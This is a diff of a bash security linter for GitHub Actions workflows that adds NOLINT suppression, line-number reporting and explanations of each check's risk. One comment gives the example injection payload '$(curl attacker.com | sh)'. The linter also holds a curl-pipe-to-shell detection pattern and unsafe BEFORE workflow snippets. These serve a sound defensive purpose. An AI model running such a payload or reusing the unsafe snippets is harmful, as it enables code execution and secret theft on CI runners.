@@ -12,6 +12,11 @@
 #   --strict      Exit with error code if any issues found
 #
 # If no FILEs are provided, scans all .yml/.yaml files in .github/workflows and .github/actions.
+#
+# Inline suppression: add a YAML comment on the flagged line:
+#   # NOLINT          suppress all checks on this line
+#   # NOLINT(24)      suppress only check 24
+#   # NOLINT(24,8)    suppress checks 24 and 8
 
 set -euo pipefail
 
@@ -212,32 +217,97 @@ log_issue() {
     local severity="$1"
     local file="$2"
     local message="$3"
+    local lines="${4:-}"
+
+    # Apply NOLINT suppression: if every reported line has a matching NOLINT
+    # comment, silently drop the finding.
+    if [[ -n "${lines}" ]] && [[ -f "${file}" ]]; then
+        lines=$(_filter_nolint "${lines}" "${file}" "${CURRENT_CHECK}")
+        if [[ -z "${lines}" ]]; then
+            return 0
+        fi
+    fi
+
+    local file_display="${file}"
+    if [[ -n "${lines}" ]]; then
+        file_display="${file}:${lines}"
+    fi
 
     if [[ "${MACHINE_OUTPUT}" == "true" ]]; then
-        # Tab-delimited: CHECK<tab>SEVERITY<tab>FILE<tab>MESSAGE
-        printf '%s\t%s\t%s\t%s\n' "${CURRENT_CHECK}" "${severity}" "${file}" "${message}"
+        # Tab-delimited: CHECK<tab>SEVERITY<tab>FILE<tab>LINES<tab>MESSAGE
+        printf '%s\t%s\t%s\t%s\t%s\n' "${CURRENT_CHECK}" "${severity}" "${file}" "${lines}" "${message}"
     else
         local color="${YELLOW}"
         if [[ "${severity}" == "CRITICAL" ]] || [[ "${severity}" == "HIGH" ]]; then
             color="${RED}"
         fi
-        printf '%b[%s]%b %s: %s\n' "${color}" "${severity}" "${NC}" "${file}" "${message}"
+        printf '%b[%s]%b %s: %s\n' "${color}" "${severity}" "${NC}" "${file_display}" "${message}"
     fi
     ISSUES_FOUND=$((ISSUES_FOUND + 1))
 }
 
+# Extract comma-separated line numbers (up to 5) from grep -n or awk NR output.
+_extract_lines() {
+    echo "$1" | awk -F: '{print $1+0}' | head -5 | paste -sd, -
+}
+
+# Check if a line has a NOLINT annotation that covers the given check number.
+#   # NOLINT          -> suppresses all checks on this line
+#   # NOLINT(24)      -> suppresses only check 24
+#   # NOLINT(24,8)    -> suppresses checks 24 and 8
+# Returns 0 (suppressed) or 1 (not suppressed).
+_is_nolint() {
+    local content="$1"
+    local check_num="$2"
+    case "${content}" in
+        *NOLINT\(*) ;;
+        *NOLINT*)  return 0 ;;
+        *)         return 1 ;;
+    esac
+    local args="${content#*NOLINT(}"
+    args="${args%%)*}"
+    local IFS=','
+    for num in ${args}; do
+        num="${num## }"; num="${num%% }"
+        [[ "${num}" == "${check_num}" ]] && return 0
+    done
+    return 1
+}
+
+# Filter line numbers through NOLINT annotations. Removes any line number
+# whose source line contains a matching NOLINT comment. Returns the filtered
+# comma-separated list, or empty string if all lines were suppressed.
+_filter_nolint() {
+    local lines="$1"
+    local file="$2"
+    local check_num="$3"
+    local filtered=""
+    IFS=',' read -ra _ln_arr <<< "${lines}"
+    for _ln in "${_ln_arr[@]}"; do
+        local _content
+        _content=$(sed -n "${_ln}p" "${file}" 2>/dev/null || true)
+        if _is_nolint "${_content}" "${check_num}"; then
+            continue
+        fi
+        filtered="${filtered:+${filtered},}${_ln}"
+    done
+    echo "${filtered}"
+}
+
 # Prints a fix example for a check class (only once per class).
-declare -A shown_examples
+# Uses a delimited string instead of associative array for bash 3.2 compatibility.
+_shown_examples="|"
 log_fix_example() {
     local class="$1"
     local example="$2"
 
-    if [[ "${shown_examples["${class}"]:-}" == "true" ]]; then
-        return
-    fi
-    shown_examples["${class}"]=true
+    case "${_shown_examples}" in
+        *"|${class}|"*) return ;;
+    esac
+    _shown_examples="${_shown_examples}${class}|"
 
-    printf '%b  Fix example:%b\n' "${CYAN}" "${NC}"
+    local check_id="${class#check_}"
+    printf '%b  Fix example (check %s):%b\n' "${CYAN}" "${check_id}" "${NC}"
     while IFS= read -r line; do
         printf '    %b%s%b\n' "${DIM}" "${line}" "${NC}"
     done <<< "${example}"
@@ -246,7 +316,14 @@ log_fix_example() {
 
 has_untrusted_trigger() {
     local file="$1"
-    grep -qE '(^|[[:space:][:punct:]])(pull_request_target|pull_request|issue_comment|discussion|discussion_comment)([[:space:][:punct:]]|$)' "${file}" 2>/dev/null
+    # Only check the on: trigger section, not the entire file
+    awk '
+        /^on:/ || /^"on":/ || /^on :/ { in_on = 1; next }
+        in_on && /^[a-z]/ && !/^[[:space:]]/ { in_on = 0 }
+        in_on && /^[[:space:]]*(pull_request_target|pull_request|issue_comment|issues|discussion|discussion_comment)[[:space:]]*:/ { found = 1; exit }
+        in_on && /^[[:space:]]*(pull_request_target|pull_request|issue_comment|issues|discussion|discussion_comment)[[:space:]]*$/ { found = 1; exit }
+        END { exit !found }
+    ' "${file}" 2>/dev/null
 }
 
 # =============================================================================
@@ -284,6 +361,10 @@ check_1_severity="HIGH"
 
 example_check_1() {
     cat <<'EOF'
+# Why: ${{ }} expressions are macro-expanded into the shell script before execution.
+# An attacker who controls a PR title or issue body can embed shell metacharacters
+# (e.g. $(curl attacker.com | sh)) that execute arbitrary commands in the runner.
+#
 # BEFORE (unsafe - attacker controls PR title):
   run: echo "${{ github.event.pull_request.title }}"
 # AFTER (safe - shell variable cannot inject commands):
@@ -299,11 +380,11 @@ check_1() {
     if grep -qE "${dangerous_patterns}" "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.(comment\.body|issue\.body|pull_request\.body|pull_request\.title)/ { print; next }
-            in_run_block && /\$\{\{.*github\.event\.(comment\.body|issue\.body|pull_request\.body|pull_request\.title)/ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.(comment\.body|issue\.body|pull_request\.body|pull_request\.title)/ { print NR; next }
+            in_run_block && /\$\{\{.*github\.event\.(comment\.body|issue\.body|pull_request\.body|pull_request\.title)/ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "Contains dangerous event data interpolation directly in run: block (comment/issue/PR body/title)"
+            log_issue "HIGH" "${file}" "Contains dangerous event data interpolation directly in run: block (comment/issue/PR body/title)" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -318,6 +399,10 @@ check_2_severity="HIGH"
 
 example_check_2() {
     cat <<'EOF'
+# Why: eval re-parses its argument as shell code. If any variable in the evaluated
+# string came from untrusted input (even via env var), the attacker gets arbitrary
+# command execution on the runner.
+#
 # BEFORE (unsafe - eval interprets arbitrary code):
   run: eval "${USER_INPUT}"
 # AFTER (safe - use direct execution or a case/switch):
@@ -332,8 +417,10 @@ EOF
 
 check_2() {
     local file="$1"
-    if grep -qE 'eval\s' "${file}" 2>/dev/null; then
-        log_issue "HIGH" "${file}" "Contains 'eval' statement - consider safer alternatives"
+    local hits
+    hits=$(grep -nE 'eval\s' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains 'eval' statement - consider safer alternatives" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
@@ -347,6 +434,10 @@ check_3_severity="MEDIUM"
 
 example_check_3() {
     cat <<'EOF'
+# Why: bash -c takes a string and executes it as shell code. When ${{ }} expressions
+# appear in that string, they are expanded before bash sees them, so attacker-controlled
+# values become part of the shell command.
+#
 # BEFORE (unsafe - interpolation happens before shell parsing):
   run: bash -c "echo ${{ inputs.command }}"
 # AFTER (safe - pass via env var):
@@ -358,8 +449,10 @@ EOF
 
 check_3() {
     local file="$1"
-    if grep -qE 'bash.*-c.*\$\{\{' "${file}" 2>/dev/null; then
-        log_issue "MEDIUM" "${file}" "Contains 'bash -c' with direct \${{ }} - ensure input is via env var"
+    local hits
+    hits=$(grep -nE 'bash.*-c.*\$\{\{' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Contains 'bash -c' with direct \${{ }} - ensure input is via env var" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
@@ -373,6 +466,11 @@ check_4_severity="HIGH"
 
 example_check_4() {
     cat <<'EOF'
+# Why: pull_request_target runs with the base repository's secrets and write token
+# but can check out the PR author's fork code. If the checkout uses the PR head ref,
+# the fork's code runs with full repository privileges — giving an external contributor
+# access to secrets and write permissions they should never have.
+#
 # pull_request_target runs with BASE repo privileges but can check out HEAD code.
 # BEFORE (unsafe - checks out and runs untrusted fork code with write token):
   on: pull_request_target
@@ -390,9 +488,13 @@ EOF
 
 check_4() {
     local file="$1"
-    if grep -qE 'pull_request_target' "${file}" 2>/dev/null && grep -q 'actions/checkout' "${file}" 2>/dev/null; then
-        log_issue "HIGH" "${file}" "Uses pull_request_target with checkout - verify PR code is not executed unsafely"
-        return 1
+    if grep -qE 'pull_request_target' "${file}" 2>/dev/null; then
+        local hits
+        hits=$(grep -nE 'actions/checkout' "${file}" 2>/dev/null || true)
+        if [[ -n "${hits}" ]]; then
+            log_issue "HIGH" "${file}" "Uses pull_request_target with checkout - verify PR code is not executed unsafely" "$(_extract_lines "${hits}")"
+            return 1
+        fi
     fi
     return 0
 }
@@ -406,6 +508,11 @@ check_5_aggregate=true
 
 example_check_5() {
     cat <<'EOF'
+# Why: Mutable tags like @v4 can be force-pushed to point to different code at any time.
+# A compromised or malicious upstream action maintainer can push new code under the same
+# tag, affecting all consumers silently. Pinning to a full SHA ensures you run exactly
+# the code you audited.
+#
 # BEFORE (mutable tag - can be moved to point to different code):
   uses: actions/checkout@v4
 # AFTER (pinned to immutable commit SHA):
@@ -460,6 +567,10 @@ check_6_aggregate=true
 
 example_check_6() {
     cat <<'EOF'
+# Why: secrets: inherit passes every repository secret to the called workflow. If that
+# workflow is compromised or has a vulnerability, all secrets are exposed rather than
+# just the ones it needs. Explicit secret passing limits the blast radius.
+#
 # BEFORE (passes ALL repo secrets to called workflow):
   uses: ./.github/workflows/build.yaml
   secrets: inherit
@@ -492,6 +603,10 @@ check_7_severity="HIGH"
 
 example_check_7() {
     cat <<'EOF'
+# Why: GitHub auto-masks GITHUB_TOKEN in logs, but only when it recognizes the pattern.
+# Printing tokens via echo or printf can bypass masking in some contexts, potentially
+# exposing credentials in publicly visible workflow logs.
+#
 # BEFORE (token value visible in workflow logs):
   run: echo "Token: ${GITHUB_TOKEN}"
   run: printf '%s\n' "${GITHUB_TOKEN}"
@@ -505,8 +620,10 @@ EOF
 
 check_7() {
     local file="$1"
-    if grep -qE '(echo|printf).*\$\{?\{?(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN)|print\s*\(.*(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN)' "${file}" 2>/dev/null; then
-        log_issue "HIGH" "${file}" "Potential token exposure in echo/printf/print statement"
+    local hits
+    hits=$(grep -nE '(echo|printf).*\$\{?\{?(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN)|print\s*\(.*(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN)' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Potential token exposure in echo/printf/print statement" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
@@ -520,6 +637,10 @@ check_8_severity="MEDIUM"
 
 example_check_8() {
     cat <<'EOF'
+# Why: write-all grants the workflow token full write access to every scope (contents,
+# packages, pull-requests, etc.). If any step is compromised, the attacker inherits all
+# those permissions. Least-privilege scoping limits what a compromised step can do.
+#
 # BEFORE (grants write access to everything):
   permissions: write-all
 # AFTER (grant only what is needed):
@@ -531,8 +652,10 @@ EOF
 
 check_8() {
     local file="$1"
-    if grep -qE 'permissions:.*write-all|write-all' "${file}" 2>/dev/null; then
-        log_issue "MEDIUM" "${file}" "Uses 'write-all' permissions - apply principle of least privilege"
+    local hits
+    hits=$(grep -nE 'permissions:.*write-all|write-all' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Uses 'write-all' permissions - apply principle of least privilege" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
@@ -546,6 +669,10 @@ check_9_severity="MEDIUM"
 
 example_check_9() {
     cat <<'EOF'
+# Why: Branch names are attacker-controlled in PRs — a fork author can name their branch
+# anything, including strings with shell metacharacters. When ${{ github.head_ref }} is
+# expanded into a run: block, the branch name becomes part of the shell command.
+#
 # BEFORE (unsafe - branch name can contain shell metacharacters):
   run: echo "Branch: ${{ github.head_ref }}"
 # AFTER (safe - shell variable is not re-parsed):
@@ -560,11 +687,11 @@ check_9() {
     if grep -qE '\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)/ { print; next }
-            in_run_block && /\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)/ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)/ { print NR; next }
+            in_run_block && /\$\{\{.*(\.head[_.]ref|\.base[_.]ref|github\.head_ref|github\.base_ref)/ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "MEDIUM" "${file}" "Contains head.ref/base.ref interpolation directly in run: block - use env var instead"
+            log_issue "MEDIUM" "${file}" "Contains head.ref/base.ref interpolation directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -579,6 +706,10 @@ check_10_severity="HIGH"
 
 example_check_10() {
     cat <<'EOF'
+# Why: Piping a remote script directly into a shell executes it without any opportunity
+# to inspect or verify the content. A compromised or MITM'd server can serve arbitrary
+# code. Download first, verify a checksum, then execute.
+#
 # BEFORE (unsafe - executes remote code without verification):
   run: curl -sSL https://example.com/install.sh | bash
 # AFTER (safe - download, inspect, then execute):
@@ -591,8 +722,10 @@ EOF
 
 check_10() {
     local file="$1"
-    if grep -qE 'curl.*\|\s*(ba)?sh|wget.*\|\s*(ba)?sh' "${file}" 2>/dev/null; then
-        log_issue "HIGH" "${file}" "Contains 'curl | bash' pattern - download and verify scripts before execution"
+    local hits
+    hits=$(grep -nE 'curl.*\|\s*(ba)?sh|wget.*\|\s*(ba)?sh' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains 'curl | bash' pattern - download and verify scripts before execution" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
@@ -606,6 +739,11 @@ check_11_severity="HIGH"
 
 example_check_11() {
     cat <<'EOF'
+# Why: inputs.*, steps.*.outputs.*, and needs.*.outputs.* are string values textually
+# substituted into the shell script via ${{ }}. If any contain shell metacharacters, they
+# become part of the executed command. Assigning to an env var first ensures the value is
+# treated as data, not code.
+#
 # BEFORE (unsafe - input/output is macro-expanded into shell code):
   run: echo "${{ needs.build.outputs.pr-number }}"
 # AFTER (safe - assign to env var, reference as shell variable):
@@ -620,11 +758,11 @@ check_11() {
     if grep -qE '\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)/ { print; next }
-            in_run_block && /\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)/ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)/ { print NR; next }
+            in_run_block && /\$\{\{.*(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.)/ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "Contains \${{ inputs.* }}, \${{ steps.*.outputs.* }}, or \${{ needs.*.outputs.* }} directly in run: block - use env var instead"
+            log_issue "HIGH" "${file}" "Contains \${{ inputs.* }}, \${{ steps.*.outputs.* }}, or \${{ needs.*.outputs.* }} directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -639,6 +777,11 @@ check_12_severity="MEDIUM"
 
 example_check_12() {
     cat <<'EOF'
+# Why: ::set-output and ::save-state workflow commands are processed from stdout. Any
+# step that prints to stdout can inject fake output values, potentially affecting
+# downstream steps. The file-based $GITHUB_OUTPUT/$GITHUB_STATE replacements are not
+# vulnerable to this log-injection attack.
+#
 # BEFORE (deprecated - vulnerable to log injection):
   run: echo "::set-output name=result::${VALUE}"
 # AFTER (safe - writes to environment file):
@@ -648,8 +791,10 @@ EOF
 
 check_12() {
     local file="$1"
-    if grep -qE '::set-output |::save-state ' "${file}" 2>/dev/null; then
-        log_issue "MEDIUM" "${file}" "Uses deprecated ::set-output or ::save-state command - use \$GITHUB_OUTPUT/\$GITHUB_STATE files instead"
+    local hits
+    hits=$(grep -nE '::set-output |::save-state ' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Uses deprecated ::set-output or ::save-state command - use \$GITHUB_OUTPUT/\$GITHUB_STATE files instead" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
@@ -663,6 +808,11 @@ check_13_severity="CRITICAL"
 
 example_check_13() {
     cat <<'EOF'
+# Why: This env var re-enables the ::set-env and ::add-path workflow commands that were
+# disabled due to CVE-2020-15228. Those commands let any process that writes to stdout
+# modify environment variables for subsequent steps, enabling arbitrary code execution
+# via LD_PRELOAD or PATH manipulation.
+#
 # BEFORE (critical - re-enables commands disabled for CVE-2020-15228):
   env:
     ACTIONS_ALLOW_UNSECURE_COMMANDS: true
@@ -676,8 +826,10 @@ EOF
 
 check_13() {
     local file="$1"
-    if grep -qE 'ACTIONS_ALLOW_UNSECURE_COMMANDS.*true' "${file}" 2>/dev/null; then
-        log_issue "CRITICAL" "${file}" "Enables ACTIONS_ALLOW_UNSECURE_COMMANDS - this re-enables dangerous set-env/add-path commands (CVE-2020-15228)"
+    local hits
+    hits=$(grep -nE 'ACTIONS_ALLOW_UNSECURE_COMMANDS.*true' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "CRITICAL" "${file}" "Enables ACTIONS_ALLOW_UNSECURE_COMMANDS - this re-enables dangerous set-env/add-path commands (CVE-2020-15228)" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
@@ -691,6 +843,11 @@ check_14_severity="MEDIUM"
 
 example_check_14() {
     cat <<'EOF'
+# WHY: toJSON() produces a JSON string that may contain quotes, newlines, or
+# backslashes. When expanded via ${{ }} into a shell script, these characters
+# break out of string context and can inject arbitrary shell commands.
+# Assign the JSON to an env var so the shell treats it as an opaque string.
+#
 # BEFORE (unsafe - JSON quotes/newlines can break shell context):
   run: |
     data='${{ toJSON(matrix.config) }}'
@@ -708,11 +865,11 @@ check_14() {
     if grep -qE 'toJSON\(' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /toJSON\(/ { print; next }
-            in_run_block && /toJSON\(/ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /toJSON\(/ { print NR; next }
+            in_run_block && /toJSON\(/ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "MEDIUM" "${file}" "Uses toJSON() directly in run: block - JSON can break shell quoting; assign to env var first"
+            log_issue "MEDIUM" "${file}" "Uses toJSON() directly in run: block - JSON can break shell quoting; assign to env var first" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -727,6 +884,11 @@ check_15_severity="HIGH"
 
 example_check_15() {
     cat <<'EOF'
+# WHY: Reusable workflows referenced by branch or tag can be silently changed
+# by the upstream maintainer. A compromised external repo could push malicious
+# code to `main` or retag a version. Pinning to a full commit SHA ensures
+# immutability.
+#
 # BEFORE (unsafe - branch can be modified by anyone with push access):
   uses: org/repo/.github/workflows/build.yaml@main
 # AFTER (safe - pinned to immutable commit):
@@ -747,12 +909,12 @@ check_15() {
             n = split(ref, parts, "@")
             refspec = parts[n]
             if (refspec !~ /^[a-f0-9]{40}$/) {
-                print ref
+                print NR
             }
         }
     ' "${file}" 2>/dev/null)
     if [[ -n "${unsafe_calls}" ]]; then
-        log_issue "HIGH" "${file}" "Cross-repo reusable workflow call uses mutable ref instead of commit SHA - pin to full SHA"
+        log_issue "HIGH" "${file}" "Cross-repo reusable workflow call uses mutable ref instead of commit SHA - pin to full SHA" "$(_extract_lines "${unsafe_calls}")"
         return 1
     fi
     return 0
@@ -766,6 +928,11 @@ check_16_severity="HIGH"
 
 example_check_16() {
     cat <<'EOF'
+# WHY: Beyond PR title/body (check 1), many other event fields are attacker-
+# controlled: workflow_run.head_branch, discussion.title/body, review.body,
+# head_commit.message, label.name, etc. These undergo the same ${{ }} macro
+# expansion and can inject shell commands when used directly in run: blocks.
+#
 # BEFORE (unsafe - attacker controls branch name in workflow_run triggers):
   run: echo "Branch: ${{ github.event.workflow_run.head_branch }}"
 # AFTER (safe - assign to env var first):
@@ -781,11 +948,11 @@ check_16() {
     if grep -qE "${additional_event_fields}" "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk -v pattern="${additional_event_fields}" "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && $0 ~ pattern { print; next }
-            in_run_block && $0 ~ pattern { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && $0 ~ pattern { print NR; next }
+            in_run_block && $0 ~ pattern { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "Contains attacker-controlled github.event field directly in run: block - use env var instead"
+            log_issue "HIGH" "${file}" "Contains attacker-controlled github.event field directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -800,6 +967,11 @@ check_17_severity="HIGH"
 
 example_check_17() {
     cat <<'EOF'
+# WHY: actions/github-script executes JavaScript. When ${{ github.event.* }}
+# is interpolated into the script: body, the attacker's data becomes JS source
+# code, enabling arbitrary code execution (e.g., closing a string literal and
+# injecting require('child_process').execSync(...)). Use process.env instead.
+#
 # BEFORE (unsafe - JS injection via issue title):
   uses: actions/github-script@v7
   with:
@@ -827,16 +999,16 @@ check_17() {
             in_action && /^[[:space:]]*script:[[:space:]]*\|/ {
                 match($0, /^[[:space:]]*/); script_indent = RLENGTH; in_script = 1; next
             }
-            in_action && /^[[:space:]]*script:/ && /\$\{\{.*github\.event\./ { print; next }
+            in_action && /^[[:space:]]*script:/ && /\$\{\{.*github\.event\./ { print NR; next }
             in_script {
                 if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_script = 0; in_action = 0; next }
                 match($0, /^[[:space:]]*/); curr_indent = RLENGTH
                 if (curr_indent <= script_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_script = 0; in_action = 0; next }
             }
-            in_script && /\$\{\{.*github\.event\./ { print }
+            in_script && /\$\{\{.*github\.event\./ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "actions/github-script contains \${{ github.event.* }} in script body - JavaScript injection risk"
+            log_issue "HIGH" "${file}" "actions/github-script contains \${{ github.event.* }} in script body - JavaScript injection risk" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -851,6 +1023,11 @@ check_18_severity="HIGH"
 
 example_check_18() {
     cat <<'EOF'
+# WHY: When a secret is expanded via ${{ secrets.* }} directly into a run:
+# block, it becomes part of the shell source text. If the step fails, error
+# traces or `set -x` output may include the secret value. Using an env var
+# keeps the secret out of the shell source and lets the runner mask it.
+#
 # BEFORE (risky - secret expanded into shell source, may leak in traces):
   run: git remote set-url origin https://${{ secrets.MY_TOKEN }}@github.com/org/repo.git
 # AFTER (safe - secret stays in env var, not embedded in shell source):
@@ -865,11 +1042,11 @@ check_18() {
     if grep -qE '\$\{\{.*secrets\.' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*secrets\./ { print; next }
-            in_run_block && /\$\{\{.*secrets\./ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*secrets\./ { print NR; next }
+            in_run_block && /\$\{\{.*secrets\./ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "Contains \${{ secrets.* }} directly in run: block - pass via env var to avoid exposure in error traces"
+            log_issue "HIGH" "${file}" "Contains \${{ secrets.* }} directly in run: block - pass via env var to avoid exposure in error traces" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -884,6 +1061,11 @@ check_19_severity="MEDIUM"
 
 example_check_19() {
     cat <<'EOF'
+# WHY: Matrix values can originate from fromJSON() of an input or external
+# source. Even when static, ${{ matrix.* }} in run blocks is a defense-in-
+# depth concern — the value is textually pasted into the shell command rather
+# than treated as data. Using an env var eliminates injection risk.
+#
 # BEFORE (matrix value is macro-expanded into shell code):
   run: echo "Testing on ${{ matrix.os }}"
 # AFTER (safe - assign to env var, reference as shell variable):
@@ -898,11 +1080,11 @@ check_19() {
     if grep -qE '\$\{\{.*matrix\.' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*matrix\./ { print; next }
-            in_run_block && /\$\{\{.*matrix\./ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*matrix\./ { print NR; next }
+            in_run_block && /\$\{\{.*matrix\./ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "MEDIUM" "${file}" "Contains \${{ matrix.* }} directly in run: block - use env var instead"
+            log_issue "MEDIUM" "${file}" "Contains \${{ matrix.* }} directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -917,6 +1099,11 @@ check_20_severity="LOW"
 
 example_check_20() {
     cat <<'EOF'
+# WHY: github.repository and github.event_name are generally trusted, but
+# defense-in-depth recommends keeping all expression interpolation out of
+# run: blocks. Using env vars costs nothing and prevents future issues if
+# these values are ever combined with untrusted data in the same expression.
+#
 # BEFORE (low risk but inconsistent with defense-in-depth):
   run: gh pr view 123 --repo "${{ github.repository }}"
 # AFTER (consistent - use workflow-level env or step env):
@@ -931,11 +1118,11 @@ check_20() {
     if grep -qE '\$\{\{.*(github\.repository[^_]|github\.event_name)' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(github\.repository[^_]|github\.event_name)/ { print; next }
-            in_run_block && /\$\{\{.*(github\.repository[^_]|github\.event_name)/ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(github\.repository[^_]|github\.event_name)/ { print NR; next }
+            in_run_block && /\$\{\{.*(github\.repository[^_]|github\.event_name)/ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "LOW" "${file}" "Contains \${{ github.repository }} or \${{ github.event_name }} directly in run: block - prefer env var for defense-in-depth"
+            log_issue "LOW" "${file}" "Contains \${{ github.repository }} or \${{ github.event_name }} directly in run: block - prefer env var for defense-in-depth" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -950,6 +1137,11 @@ check_21_severity="HIGH"
 
 example_check_21() {
     cat <<'EOF'
+# WHY: pull_request_target workflows run with the base repo's GITHUB_TOKEN
+# and secrets. Checking out the PR head ref brings untrusted fork code into
+# this privileged context. If credentials persist (the default), the forked
+# code can use them to push to the base repo, create releases, etc.
+#
 # BEFORE (unsafe - PR head checkout plus persisted credentials):
   on: pull_request_target
   steps:
@@ -975,22 +1167,26 @@ check_21() {
         return 0
     fi
 
-    if grep -q 'actions/checkout' "${file}" 2>/dev/null && \
-       grep -qE 'github\.event\.pull_request\.head\.(sha|ref|repo\.full_name)|github\.head_ref' "${file}" 2>/dev/null; then
-        log_issue "HIGH" "${file}" "pull_request_target checks out the PR head ref/repository - this can execute untrusted code with base-repository privileges"
+    local checkout_lines
+    checkout_lines=$(grep -nE 'actions/checkout' "${file}" 2>/dev/null || true)
+    local head_ref_lines
+    head_ref_lines=$(grep -nE 'github\.event\.pull_request\.head\.(sha|ref|repo\.full_name)|github\.head_ref' "${file}" 2>/dev/null || true)
+
+    if [[ -n "${checkout_lines}" ]] && [[ -n "${head_ref_lines}" ]]; then
